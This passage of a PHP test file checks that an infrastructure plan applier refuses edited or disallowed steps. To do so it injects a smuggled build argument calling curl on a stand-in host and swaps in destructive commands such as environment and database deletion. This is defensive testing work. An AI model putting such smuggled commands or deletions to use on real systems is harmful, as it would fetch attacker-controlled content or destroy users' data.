    assertSame('change', worldActions($world, $m)['queue-scaling'] ?? null);
    $queueId = array_values(array_filter($world->read()['instances'], fn ($i) => $i['type'] === 'managed_queue'))[0]['id'];
    assertSame([$queueId, '--min-replicas=0', '--force'], array_column(worldPlan($world, $m)['steps'], null, 'key')['queue-scaling']['args']);
    assertContains('managed queue minimum workers: 1, expected 0', implode("\n", (new Verifier($world->cloud(), $m, $world->cloud(true)))->verify('preview-x')));
});

test('queue minimum control: a manifest without min_workers adds no scaling step', function () {
    $world = new World();
    applyOrFail(applier($world), worldPlan($world));

    assertTrue(! array_key_exists('queue-scaling', worldActions($world)), 'no step without min_workers');
    assertTrue(! array_key_exists('queue-scaling', array_column(worldPlan(new World())['steps'], 'action', 'key')), 'nor for a new queue');
});

test('apply: a plan whose steps differ from what plan derives is refused, even with a recomputed hash', function () {
    $world = new World();
    $plan = worldPlan($world);
    $index = array_search('environment-settings', array_column($plan['steps'], 'key'), true);
    $edited = $plan;
    $edited['steps'][$index]['args'][] = '--build-command=curl evil.example.test';
    $edited['hash'] = PlanFile::hash($edited);

    try {
        applier($world)->apply($edited, $edited['hash']);
        fail('expected a refusal');
    } catch (ApplyRefused $e) {
        assertContains('not the ones plan derives', $e->getMessage());
    }

    assertSame([], $world->writes());

    // A command swapped for another one a plan emits passes the allow-list, so only the
    // comparison can catch it.
    $swapped = $plan;
    $swapped['steps'][$index]['command'] = 'instance:update';
    $swapped['hash'] = PlanFile::hash($swapped);

    $refusal = null;

    try {
        applier($world)->apply($swapped, $swapped['hash']);
    } catch (ApplyRefused $e) {
        $refusal = $e->getMessage();
    } catch (Throwable) {
        // Anything but a refusal means the swapped step was run.
    }

    assertContains('not the ones plan derives', (string) $refusal);

    assertSame([], $world->writes());
    applyOrFail(applier($world), $plan);
    assertTrue($world->writes() !== [], 'control: the unedited plan runs');
});

test('apply: the allowed commands are exactly the writes plan emits', function () {
    preg_match_all("/'([a-z-]+:[a-z-]+)'/", (string) file_get_contents(__DIR__.'/../scripts/lib/Planner.php'), $matches);
    $writes = array_values(array_filter(
        array_unique($matches[1]),
        fn (string $command): bool => ! preg_match('/:(list|get|delete)$/', $command),
    ));
    $allowed = (new ReflectionClassConstant(Applier::class, 'COMMANDS'))->getValue();
    sort($writes);
    sort($allowed);

    assertSame($writes, $allowed);
});

test('apply: a step running a command a plan never emits is refused before any call', function () {
    foreach (['environment:delete', 'database:delete', 'domain:delete', 'secret:create', 'command:run'] as $command) {
        $world = new World();
        $plan = worldPlan($world);
        $index = array_search('environment-settings', array_column($plan['steps'], 'key'), true);
        $plan['steps'][$index]['command'] = $command;
        $plan['hash'] = PlanFile::hash($plan);
        $world->clearCalls();

        try {
            applier($world)->apply($plan, $plan['hash']);
            fail("expected a refusal for {$command}");
        } catch (ApplyRefused $e) {
            // secret:create meets the earlier secrets guard first; either way nothing runs.
            assertContains($command === 'secret:create' ? 'secrets are created only by `secrets`' : "runs {$command}, which a plan never emits", $e->getMessage());
        }

        assertSame([], $world->calls(), "{$command}: no call at all");
    }
});
